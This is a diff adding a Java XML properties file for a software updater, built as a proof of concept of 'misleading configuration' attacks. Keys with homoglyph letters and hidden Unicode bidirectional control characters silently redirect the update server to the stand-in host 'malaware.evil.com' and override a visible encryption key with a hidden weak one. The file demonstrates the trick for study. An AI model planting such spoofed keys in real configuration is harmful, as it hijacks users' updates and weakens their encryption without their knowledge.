@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">
+<properties>
+    <!-- Configuration parameters for automatic software update -->
+    <entry key="Client.Name">nome_client</entry>
+    <entry key="Server.Host">update.acme.com</entry> <!-- Enter hostname of YOUR backend server -->
+    <entry key="p1">p1 value</entry>
+    <entry key="p2">p3 value</entry>
+    <entry key="p3"> ... </entry>
+    <!-- Misleading configuration attack PoC 01: the client will connect to this server instead of the intended one""   -->
+    <entry key="Server.Нost">emanuelebuchicchio.com</entry>
+    <!-- Misleading configuration attack PoC 02: the client will connect to this server instead of the intended one""   -->
+    <entry key="Server.Host‮⁦//hostname⁩⁦">malaware.evil.com</entry>
+    
+   
+    <!-- Enter here YOUR super secret encryption key -->
+    <entry key="encryption.key">12345678</entry>
+    <entry key="p4">p4 value</entry>
+    <entry key="p5">p5 value</entry>
+    <!-- ....-->
+    <!-- Misleading configuration attack
+    the application will use the encription key
+    hidden after plenty other settings
+    instead of the key provided 
+    by the victim in the much more visible 
+    configuration     key above  -->
+    <entry key="encryption.kｅy">123123123</entry>
+</properties>
